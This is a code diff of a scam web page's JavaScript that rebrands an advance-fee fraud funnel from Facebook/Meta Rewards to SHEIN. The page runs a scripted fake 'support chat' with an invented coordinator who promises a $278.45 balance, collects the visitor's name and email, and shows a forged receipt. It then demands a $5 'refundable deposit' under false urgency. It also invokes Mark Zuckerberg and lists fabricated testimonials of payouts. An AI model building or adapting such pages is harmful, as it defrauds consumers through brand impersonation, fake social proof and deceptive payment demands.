+            '<div class="shein-brand-title"><span>' + p.name + '</span><img src="images/verified.png" alt="Official"></div>' +
+            '<div class="shein-sku-line"><span>' + p.sku + '</span> · <span class="shein-tag-mini">' + p.badge + '</span></div>' +
           '</div>' +
         '</div>' +
-        '<button class="fb-more" aria-label="More options"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="1"></circle><circle cx="19" cy="12" r="1"></circle><circle cx="5" cy="12" r="1"></circle></svg></button>' +
+        '<div class="shein-free-returns"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"></polyline></svg> Free Returns</div>' +
       '</div>' +
-      '<div class="fb-copy">' + p.text + '</div>' +
-      '<img alt="' + p.name + '" class="fb-media" decoding="async" fetchpriority="high" src="' + p.image + '">' +
-      '<div class="fb-stats">' +
-          '<div class="fb-reactions">' +
-            '<div class="fb-reaction-stack">' +
-              '<div class="fb-reaction">👍</div>' +
-              '<div class="fb-reaction">❤️</div>' +
-              '<div class="fb-reaction">😮</div>' +
-            '</div>' +
-            '<span>' + p.likes + '</span>' +
-          '</div>' +
-          '<div class="fb-stat-right"><span>' + p.comments + '</span><span>' + p.shares + '</span></div>' +
+      '<div class="shein-product-image-wrap">' +
+        '<img alt="' + p.name + '" class="shein-product-media" decoding="async" fetchpriority="high" src="' + p.image + '">' +
+        '<span class="shein-overlay-tag">' + p.category + '</span>' +
       '</div>' +
-      '<div class="fb-actions">' +
-            '<button class="fb-action"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path></svg><span>Like</span></button>' +
-            '<button class="fb-action"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M7.9 20A9 9 0 1 0 4 16.1L2 22Z"></path></svg><span>Comment</span></button>' +
-            '<button class="fb-action"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" x2="15.42" y1="13.51" y2="17.49"></line><line x1="15.41" x2="8.59" y1="6.51" y2="10.49"></line></svg><span>Share</span></button>' +
+      '<div class="shein-price-bar">' +
+        '<div class="shein-price-left">' +
+          '<span class="shein-curr-price">' + p.price + '</span>' +
+          '<span class="shein-old-price">' + p.oldPrice + '</span>' +
+          '<span class="shein-discount-tag">' + p.discount + '</span>' +
+        '</div>' +
+        '<div class="shein-rating-badge">' +
+          '<span class="text-[#FFB800] text-sm font-bold">★★★★★</span>' +
+          '<span class="text-xs text-gray-500 font-semibold">(' + p.rating + ')</span>' +
+        '</div>' +
       '</div>' +
-      '<div class="fb-survey">' +
-          '<div class="fb-survey-kicker">Answer the question:</div>' +
-          '<div class="fb-question">' + p.question + '</div>' +
-        '<div class="fb-votes">' +
-          '<button type="button" onclick="vote()" class="fb-vote fb-vote-no" data-funnel-step="' + nextKey + '">' +
-            '<svg width="20" height="20" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 14V2"></path><path d="M9 18.12 10 14H4.17a2 2 0 0 1-1.92-2.56l2.33-8A2 2 0 0 1 6.5 2H20a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2h-2.76a2 2 0 0 0-1.79 1.11L12 22a3.13 3.13 0 0 1-3-3.88Z"></path></svg>' +
-            '<span>Not relevant</span>' +
+      '<div class="shein-product-copy">' + p.text + '</div>' +
+      '<div class="shein-survey-box">' +
+        '<div class="shein-survey-kicker">Reviewer Assessment · Item ' + n + ' of 3</div>' +
+        '<div class="shein-survey-question">' + p.question + '</div>' +
+        '<div class="shein-votes">' +
+          '<button type="button" onclick="vote()" class="shein-vote shein-vote-secondary" data-funnel-step="' + nextKey + '">' +
+            '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>' +
+            '<span>' + p.voteNo + '</span>' +
           '</button>' +
-          '<button type="button" onclick="vote()" class="fb-vote fb-vote-yes" data-funnel-step="' + nextKey + '">' +
-            '<svg width="20" height="20" viewBox="0 0 24 24" fill="white" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 10v12"></path><path d="M15 5.88 14 10h5.83a2 2 0 0 1 1.92 2.56l-2.33 8A2 2 0 0 1 17.5 22H4a2 2 0 0 1-2-2v-8a2 2 0 0 1 2-2h2.76a2 2 0 0 0 1.79-1.11L12 2a3.13 3.13 0 0 1 3 3.88Z"></path></svg>' +
-            '<span>Relevant</span>' +
+          '<button type="button" onclick="vote()" class="shein-vote shein-vote-primary" data-funnel-step="' + nextKey + '">' +
+            '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>' +
+            '<span>' + p.voteYes + '</span>' +
           '</button>' +
         '</div>' +
       '</div>';
@@ -908,13 +929,13 @@
   var supportInputKind = null;
   var supportName = "";
   var supportEmail = "";
-  var currentSupportAgent = "facebook";
+  var currentSupportAgent = "shein";
 
   function getAgentAvatarHtml() {
     if (currentSupportAgent === "emily") {
-      return '<img class="support-mini-avatar" src="images/emily-support.webp" alt="Emily Carter">';
+      return '<img class="support-mini-avatar" src="images/emily-support.webp" alt="Chloe Bennett">';
     }
-    return '<svg class="support-mini-avatar support-mini-fb" viewBox="0 0 36 36" width="34" height="34" fill="none"><circle cx="18" cy="18" r="18" fill="#1877F2"/><path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/></svg>';
+    return '<svg class="support-mini-avatar support-mini-fb" viewBox="0 0 36 36" width="34" height="34" fill="none"><circle cx="18" cy="18" r="18" fill="#111111"/><text x="18" y="24" font-family=\"Inter\", sans-serif font-weight="900" font-size="18" fill="#FFFFFF" text-anchor="middle">S</text></svg>';
   }
 
   function updateSupportAgentCard(agent) {
@@ -923,12 +944,12 @@
     var roleEl = document.getElementById("support-agent-role");
     if (!wrap || !nameEl || !roleEl) return;
     if (agent === "emily") {
-      wrap.innerHTML = '<img class="support-agent-avatar" src="images/emily-support.webp" alt="Emily Carter">';
-      nameEl.textContent = "Emily Carter";
-      roleEl.innerHTML = '<span class="support-status-dot"></span><span>Online</span>';
+      wrap.innerHTML = '<img class="support-agent-avatar" src="images/emily-support.webp" alt="Chloe Bennett">';
+      nameEl.textContent = "Chloe Bennett";
+      roleEl.innerHTML = '<span class="support-status-dot"></span><span>SHEIN Reviewer Coordinator · Online</span>';
     } else {
-      wrap.innerHTML = '<svg class="support-fb-circle" viewBox="0 0 36 36" width="44" height="44" fill="none"><circle cx="18" cy="18" r="18" fill="#1877F2"/><path fill="#ffffff" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/></svg>';
-      nameEl.textContent = "Facebook Support";
+      wrap.innerHTML = '<svg class="support-fb-circle" viewBox="0 0 36 36" width="44" height="44" fill="none"><circle cx="18" cy="18" r="18" fill="#111111"/><text x="18" y="27" font-family=\"Inter\", sans-serif font-weight="900" font-size="20" fill="#FFFFFF" text-anchor="middle">S</text></svg>';
+      nameEl.textContent = "SHEIN VIP Support";
       roleEl.innerHTML = '<span class="support-status-dot"></span><span>Online</span>';
     }
   }
@@ -952,8 +973,6 @@
       .trim();
     var len = plain.length;
     // Conversational typing rhythm based on message length:
-    // ~26ms per character + 750ms base
-    // Minimum 1300ms, maximum 4500ms
     var ms = 750 + Math.round(len * 26);
     if (ms < 1300) ms = 1300;
     if (ms > 4500) ms = 4500;
@@ -961,48 +980,48 @@
   }
 
   var SUPPORT_STEPS = [
-    { type:"text", track:"boas_vindas", text:"Hi, welcome to <strong>Facebook Support!</strong>" },
+    { type:"text", track:"boas_vindas", text:"Hi, welcome to <strong>SHEIN VIP Support!</strong>" },
     { type:"wait", ms:1200 },
-    { type:"text", text:"To begin your service, your case number is <strong>809821</strong>" },
+    { type:"text", text:"To begin your service, your Evaluator Case ID is <strong>#SH-809821</strong>" },
     { type:"wait", ms:1300 },
-    { type:"text", text:"You've been <strong>one of the few people</strong> selected for the<br><strong>Meta Rewards Program.</strong>" },
+    { type:"text", text:"You've been selected for the official<br><strong>SHEIN Product Reviewer Program.</strong>" },
     { type:"wait", ms:1000 },
-    { type:"join", track:"atendente", text:"Emily Carter joined the chat" },
+    { type:"join", track:"atendente", text:"Chloe Bennett joined the chat" },
     { type:"wait", ms:1400 },
-    { type:"text", text:"My name is Emily and I'll help you redeem your reward." },
+    { type:"text", text:"My name is Chloe Bennett and I'm your assigned Reviewer Coordinator." },
     { type:"wait", ms:1200 },
     { type:"video", track:"video_1", id:"6abd374d673e2b44981dc239" },
     { type:"wait", ms:2000 },
-    { type:"text", text:"You have a balance of <strong>$278.45</strong> in our app" },
+    { type:"text", text:"You have an accumulated balance of <strong>$278.45</strong> in your evaluator wallet." },
     { type:"wait", ms:1500 },
-    { type:"text", text:"Would you like to continue so you can <strong>withdraw your money?</strong>" },
-    { type:"choice", label:"Yes, I want to withdraw my money" },
+    { type:"text", text:"Would you like to proceed so you can <strong>withdraw your earnings?</strong>" },
+    { type:"choice", label:"Yes, I want to withdraw my earnings" },
     { type:"wait", ms:1200 },
-    { type:"text", text:'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00a854" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-3px;margin-right:7px;"><circle cx="12" cy="12" r="10"></circle><polyline points="8 12 11 15 16 9"></polyline></svg>Okay, I\'ll continue with your registration.' },
+    { type:"text", text:'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00a854" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-3px;margin-right:7px;"><circle cx="12" cy="12" r="10"></circle><polyline points="8 12 11 15 16 9"></polyline></svg>Perfect, I will prepare your reviewer payout file.' },
     { type:"wait", ms:1200 },
-    { type:"text", text:"At this stage, I need you to tell me your name<br>so I can verify that you're a new user." },
+    { type:"text", text:"Please confirm your full name so I can issue your official payout voucher." },
     { type:"input", field:"name", placeholder:"Full name" },
     { type:"wait", ms:1200 },
-    { type:"text", text:'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00a854" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-3px;margin-right:7px;"><circle cx="12" cy="12" r="10"></circle><polyline points="8 12 11 15 16 9"></polyline></svg>Everything looks good, {name}!<br><br>I checked our system and saw that you are eligible to receive your commission of $278.45.' },
+    { type:"text", text:'<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00a854" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round" style="display:inline-block;vertical-align:-3px;margin-right:7px;"><circle cx="12" cy="12" r="10"></circle><polyline points="8 12 11 15 16 9"></polyline></svg>Verified successfully, {name}!<br><br>I verified your account and your commission of $278.45 for evaluating the 3 fashion items has been approved.' },
     { type:"wait", ms:1200 },
-    { type:"text", text:"I'm sending you the receipt for your commissions." },
+    { type:"text", text:"I am generating your official SHEIN payout voucher..." },
     { type:"wait", ms:1200 },
     { type:"receiptLoading", ms:3000 },
     { type:"receipt", track:"recibo" },
     { type:"wait", ms:2000 },
-    { type:"choice", label:"I want to claim my reward" },
+    { type:"choice", label:"I want to claim my payout" },
     { type:"wait", ms:1200 },
-    { type:"text", text:"I'm sending you the official withdrawal tutorial posted by <strong>Mark Zuckerberg</strong>. Watch it to see step-by-step how to register your bank account and withdraw your earnings 👇" },
+    { type:"text", text:"I'm sending you the official withdrawal guide from our <strong>SHEIN Reviewer Team</strong>. Watch it step-by-step to link your bank account and withdraw your earnings 👇" },
     { type:"wait", ms:1400 },
     { type:"fbPost", track:"video_2_zuck", id:"6abc96cf953cdb1ddef4ea63", padding:"125%" },
     { type:"wait", ms:3000 },
-    { type:"text", track:"pitch", text:"<strong>To receive your $278.45 reward.</strong><br><br>You'll need to pay <strong>a small $5.00 fee</strong> to secure your spot in our <strong>Meta Program</strong>" },
+    { type:"text", track:"pitch", text:"<strong>To release your $278.45 payout:</strong><br><br>You only need to complete a <strong>small $5.00 identity security deposit</strong> to activate your official <strong>SHEIN Evaluator Pass</strong>." },
     { type:"wait", ms:1500 },
-    { type:"text", text:"<strong>Important:</strong> The fee is fully refunded after registration, together with your current balance of <strong>$278.45</strong>" },
+    { type:"text", text:"<strong>Important:</strong> The deposit is fully refunded after registration, together with your total balance of <strong>$278.45</strong>." },
     { type:"wait", ms:1500 },
-    { type:"text", text:"<strong>This is a unique opportunity for you, since you made it this far. If you give up, your reward will be sent to someone else.</strong><br><br><strong>Your balance will be sent to the same card you register in the verification step.</strong><br><br><strong>Remember the fee is refunded together with your commissions balance.</strong>" },
+    { type:"text", text:"<strong>This is an exclusive reviewer spot. If you cancel, your allocation will be assigned to another applicant on the waiting list.</strong><br><br><strong>Your balance will be deposited to the account or card you register in the verification step.</strong><br><br><strong>Remember: The deposit is 100% refunded together with your commissions.</strong>" },
     { type:"wait", ms:3000 },
-    { type:"text", text:"<strong>I'll send you the link so you can pay the fee and receive your commissions balance</strong>" },
+    { type:"text", text:"<strong>Here is your secure link to activate your Evaluator Pass and claim your payout:</strong>" },
     { type:"wait", ms:3000 },
     { type:"checkout" }
   ];
@@ -1010,8 +1029,8 @@
   function initSupportChat() {
     if (supportStarted) return;
     supportStarted = true;
-    currentSupportAgent = "facebook";
-    updateSupportAgentCard("facebook");
+    currentSupportAgent = "shein";
+    updateSupportAgentCard("shein");
     supportIndex = 0;
     setTimeout(runSupportStep, 250);
   }
@@ -1073,25 +1092,25 @@
     var chat = document.getElementById("support-chat");
     if (!chat) return;
     supportTyping(false);
-    var ref = "MP-" + Math.floor(100000 + Math.random() * 900000);
+    var ref = "SHP-" + Math.floor(100000 + Math.random() * 900000);
     var row = document.createElement("div");
     row.className = "support-row";
     var now = new Date();
     var date = String(now.getMonth() + 1).padStart(2, "0") + "/" + String(now.getDate()).padStart(2, "0") + "/" + now.getFullYear();
     row.innerHTML = getAgentAvatarHtml() +
       '<article class="support-receipt">' +
-        '<div class="support-receipt-head"><div class="support-receipt-brand"><img class="support-receipt-logo" src="images/meta-rewards-logo.png" alt=""><span>Meta Rewards</span></div><span>Ref. ' + ref + '</span></div>' +
-        '<div class="support-receipt-title">Commission Receipt</div>' +
+        '<div class="support-receipt-head"><div class="support-receipt-brand"><img class="support-receipt-logo" src="images/shein-icon.svg" alt="" style="width:24px;height:24px;object-fit:contain;"><span>SHEIN VIP</span></div><span>Ref. ' + ref + '</span></div>' +
+        '<div class="support-receipt-title">Evaluator Earnings Receipt</div>' +
         '<div class="support-receipt-body">' +
-          '<div class="support-receipt-parties"><div><div class="support-receipt-blue">From</div><strong>Meta Rewards Inc.</strong><div class="support-receipt-muted">Menlo Park, California</div></div><div class="support-receipt-to"><div class="support-receipt-blue">To</div><strong>' + escapeSupportText(supportName || "—") + '</strong><div class="support-receipt-muted">' + escapeSupportText(supportEmail || "—") + '</div></div></div>' +
-          '<div class="support-receipt-table"><div class="support-receipt-table-row support-receipt-table-head"><span>Description</span><span>Qty</span><span>Total</span></div><div class="support-receipt-table-row support-receipt-table-value"><span>Payment for ad evaluation</span><span>1</span><span>$278.45</span></div></div>' +
+          '<div class="support-receipt-parties"><div><div class="support-receipt-blue">From</div><strong>SHEIN VIP Services Ltd.</strong><div class="support-receipt-muted">Los Angeles, California</div></div><div class="support-receipt-to"><div class="support-receipt-blue">To</div><strong>' + escapeSupportText(supportName || "—") + '</strong><div class="support-receipt-muted">' + escapeSupportText(supportEmail || "—") + '</div></div></div>' +
+          '<div class="support-receipt-table"><div class="support-receipt-table-row support-receipt-table-head"><span>Description</span><span>Qty</span><span>Total</span></div><div class="support-receipt-table-row support-receipt-table-value"><span>Product Evaluation Payout (Batch #3)</span><span>3</span><span>$278.45</span></div></div>' +
           '<div class="support-receipt-total"><span>Total</span><strong>$278.45</strong></div>' +
-          '<div class="support-receipt-details"><div><div><strong>Ref.</strong> ' + ref + '</div><div><strong>Issued:</strong> ' + date + '</div><div class="support-receipt-muted">This receipt confirms the approved commission payment.</div></div><div class="support-receipt-sign"><div class="support-receipt-signature">Michael R. Santos</div><strong>Chief Financial Officer</strong><div class="support-receipt-muted">Meta Rewards Inc.</div></div></div>' +
-          '<div class="support-receipt-method"><strong>Payment method:</strong> Bank transfer</div>' +
+          '<div class="support-receipt-details"><div><div><strong>Ref.</strong> ' + ref + '</div><div><strong>Issued:</strong> ' + date + '</div><div class="support-receipt-muted">This voucher confirms the approved evaluator compensation.</div></div><div class="support-receipt-sign"><div class="support-receipt-signature">Elena Vance</div><strong>Review Operations Director</strong><div class="support-receipt-muted">SHEIN VIP Program</div></div></div>' +
+          '<div class="support-receipt-method"><strong>Payout method:</strong> Direct Deposit / Bank Transfer</div>' +
         '</div><div class="support-receipt-foot">' +
           '<div class="receipt-foot-brand">' +
-            '<svg width="17" height="17" viewBox="0 0 36 36" fill="none"><circle cx="18" cy="18" r="18" fill="#ffffff"/><path fill="#1877F2" d="M24.8 23.2l.7-4.8h-4.6v-3.1c0-1.3.6-2.6 2.7-2.6h2.1V8.6s-1.9-.3-3.7-.3c-3.8 0-6.3 2.3-6.3 6.5v3.6h-4.2v4.8h4.2V35.6c.9.1 1.7.2 2.6.2s1.7-.1 2.6-.2V23.2h3.7z"/></svg>' +
-            '<div class="receipt-foot-text"><span class="receipt-foot-name">facebook</span><span class="receipt-foot-sub">rewards</span></div>' +
+            '<img src="images/shein-icon.svg" width="18" height="18" alt="SHEIN">' +
+            '<div class="receipt-foot-text"><span class="receipt-foot-name" style="letter-spacing:1px;font-weight:900;">SHEIN</span><span class="receipt-foot-sub" style="color:var(--shein-coral);">VIP EVALUATOR</span></div>' +
           '</div>' +
         '</div>' +
       '</article>';
@@ -1298,14 +1317,14 @@
   var EXTRA_FB_COMMENTS = [
     { name: "Brandon Lee", avatar: "images/comments/extra_1.webp", text: "Just saw the funds in my Wells Fargo! $430 cleared instantly! 🔥", time: "Just now", reactions: 14 },
     { name: "Stephanie Miller", avatar: "images/comments/extra_2.webp", text: "Followed the video step-by-step and it worked on the first try! $510 received! 😭 ❤️", time: "Just now", reactions: 22 },
-    { name: "Marcus Wright", avatar: "images/comments/extra_3.webp", text: "Bro Mark is the real MVP!! $680 cashout confirmed on my screen right now 🚀 💰", time: "Just now", reactions: 19 },
+    { name: "Marcus Wright", avatar: "images/comments/extra_3.webp", text: "SHEIN VIP is the real deal!! $680 cashout confirmed on my screen right now 🚀 💰", time: "Just now", reactions: 19 },
     { name: "Chloe Bennett", avatar: "images/comments/extra_4.webp", text: "I was skeptical at first, but $390 literally just dropped into my account!! Thank you!! 🙌 ✨", time: "Just now", reactions: 31 },
     { name: "Daniel Martinez", avatar: "images/comments/extra_5.webp", text: "FASTEST withdrawal of my life. 3 minutes and $475 was ready in my Chase account 💸", time: "Just now", reactions: 16 },
     { name: "Hannah Scott", avatar: "images/comments/extra_6.webp", text: "My hands were shaking when the notification popped up: $560 received!! 🎉 🥳", time: "Just now", reactions: 27 },
     { name: "Justin Taylor", avatar: "images/comments/extra_7.webp", text: "YESSS!! Direct deposit cleared for $620! Easiest money I've ever made in 2026 🤑", time: "Just now", reactions: 35 },
     { name: "Ashley Adams", avatar: "images/comments/extra_8.webp", text: "Watching this video paid off!! $410 withdrawal approved and received! 💕 🙏", time: "Just now", reactions: 18 },
     { name: "Tyler Robinson", avatar: "images/comments/extra_9.webp", text: "Instant transfer worked seamlessly! $740 in my balance! Absolutely legendary! 🤯 💵", time: "Just now", reactions: 42 },
-    { name: "Megan Harris", avatar: "images/comments/extra_10.webp", text: "Got my $495 right after entering my info! Thank you Facebook Rewards program! 🌸 ✨", time: "Just now", reactions: 24 },
+    { name: "Megan Harris", avatar: "images/comments/extra_10.webp", text: "Got my $495 right after entering my info! Thank you SHEIN VIP Reviewer team! 🌸 ✨", time: "Just now", reactions: 24 },
     { name: "Ryan Clark", avatar: "images/comments/extra_11.webp", text: "Can confirm this is 100% legit!! $530 just hit my credit union account! 🏆 💰", time: "Just now", reactions: 29 },
     { name: "Brianna Lewis", avatar: "images/comments/extra_12.webp", text: "I literally cried happy tears! $460 paid my electric bill today!! God bless! 😭 ❤️", time: "Just now", reactions: 53 },
     { name: "Jordan Walker", avatar: "images/comments/extra_13.webp", text: "BOOM! $690 received! Don't skip the tutorial guys, it shows everything! 🎯 💸", time: "Just now", reactions: 33 },
@@ -1313,7 +1332,7 @@
     { name: "Christian Young", avatar: "images/comments/extra_15.webp", text: "Man I never win anything, but $580 just landed in my bank account!! 🔥 🚀", time: "Just now", reactions: 38 },
     { name: "Kayla King", avatar: "images/comments/extra_16.webp", text: "Just refreshed my banking app and $515 is ALREADY THERE! Screaming!! 🎉 😱", time: "Just now", reactions: 45 },
     { name: "Austin Wright", avatar: "images/comments/extra_17.webp", text: "Legitimately blown away! $640 withdrawal done in under 5 minutes! 💵 💪", time: "Just now", reactions: 28 },
-    { name: "Victoria Green", avatar: "images/comments/extra_18.webp", text: "Thank you Zuck and team! $480 deposited directly to my debit card! 🙏 💖", time: "Just now", reactions: 36 },
+    { name: "Victoria Green", avatar: "images/comments/extra_18.webp", text: "Thank you SHEIN and team! $480 deposited directly to my debit card! 🙏 💖", time: "Just now", reactions: 36 },
     { name: "Dylan Baker", avatar: "images/comments/extra_19.webp", text: "Just got the bank SMS: +$710! This program is an absolute blessing! ⚡ 💰", time: "Just now", reactions: 49 },
     { name: "Samantha Nelson", avatar: "images/comments/extra_20.webp", text: "My sister and I both got ours! $550 in mine right now! Best day! 🎊 ☀️", time: "Just now", reactions: 58 },
     { name: "Lucas Mitchell", avatar: "images/comments/extra_21.webp", text: "Done and dusted! $605 in my account balance! Follow the video instructions! 🚀", time: "Just now", reactions: 26 },
@@ -1599,14 +1618,14 @@
       '<div class="chat-fb-post-wrapper">' +
         '<article class="chat-fb-post">' +
           '<div class="chat-fb-post-head">' +
-            '<div class="chat-fb-avatar"><img src="images/zuck.webp" alt="Mark Zuckerberg"></div>' +
+            '<div class="chat-fb-avatar"><img src="images/shein-icon.svg" alt="SHEIN Official" style="border-radius:50%;object-fit:cover;"></div>' +
             '<div class="chat-fb-post-meta">' +
-              '<div class="chat-fb-post-name"><span>Mark Zuckerberg</span><img src="images/verified.png" alt="Verified"></div>' +
-              '<div class="chat-fb-sponsored"><span>Sponsored</span><span>·</span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path></svg></div>' +
+              '<div class="chat-fb-post-name"><span>SHEIN Official</span><img src="images/verified.png" alt="Verified"></div>' +
+              '<div class="chat-fb-sponsored"><span>Official Tutorial</span><span>·</span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path><path d="M2 12h20"></path></svg></div>' +
             '</div>' +
             '<button class="chat-fb-more" aria-label="More options"><svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="2"></circle><circle cx="12" cy="12" r="2"></circle><circle cx="19" cy="12" r="2"></circle></svg></button>' +
           '</div>' +
-          '<div class="chat-fb-copy">Watch this 4-minute tutorial to learn how to register your bank account and withdraw your earnings. Step-by-step guide for instant withdrawals.</div>' +
+          '<div class="chat-fb-copy">Watch this short tutorial to verify your reviewer status and unlock instant payout transfer directly to your chosen account.</div>' +
           '<div class="chat-fb-video-wrap">' +
             '<div id="ifr_' + playerId + '_wrapper" style="margin: 0 auto; width: 100%;">' +
               '<div style="position: relative; padding: ' + padding + ' 0 0 0;" id="ifr_' + playerId + '_aspect">' +
